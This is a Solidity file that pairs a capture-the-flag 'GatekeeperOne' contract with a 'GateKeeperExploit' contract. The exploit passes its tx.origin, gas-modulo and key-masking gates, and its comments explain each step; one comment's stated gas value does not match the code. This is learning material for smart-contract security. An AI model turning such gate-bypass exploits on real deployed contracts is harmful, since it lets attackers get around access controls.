// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GateKeeperExploit {
    GatekeeperOne private immutable gatekeeper;

    constructor(address _add) {
        gatekeeper = GatekeeperOne(_add);
    }

    function hack() external returns (bool) {
        // since we are sending via smart contract
        // first condition require(msg.sender != tx.origin) will be satisfied

        // for second condition gasleft() % 8191 == 0) to be satisfies, its a matter of trial and error
        // keep changing gas until gate 2 gets satisied
        // I found the gas value is 6000

        // key generation
        // first condition is uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // to satisy this 0x11111111 = 0x1111 -> this is only possible if we used a mask of 0x0000ffff
        // when we do bytesA & mask -> we get a bytesB which satisfies this condition

        // second condition is  uint32(uint64(_gateKey)) != uint64(_gateKey)
        // to satisy this 0x1111111100001111 = 0x00001111 -> this is posible if we use mask 0xffffffff0000ffff
        // when we do bytesA * mask above -> we get bytesB which satisfies both conditions above

        // third condition is uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        // to satisy this, we just need a bytes8 based on tx origin
        // use uint64(uint160(tx.origin)) && 0xffffffff0000ffff and we should get third condition trye
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        return gatekeeper.enter{gas: 802929}(key);
    }

    function test()
        external
        view
        returns (uint32 key3264, uint64 key64, uint160 key160, uint16 key1664, uint16 key16160)
    {
        bytes8 inputBytes8 = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        key3264 = uint32(uint64(inputBytes8));
        key64 = uint64(inputBytes8);
        key160 = uint160(tx.origin);
        key1664 = uint16(uint64(inputBytes8));
        key16160 = uint16(uint160(tx.origin));
    }
}
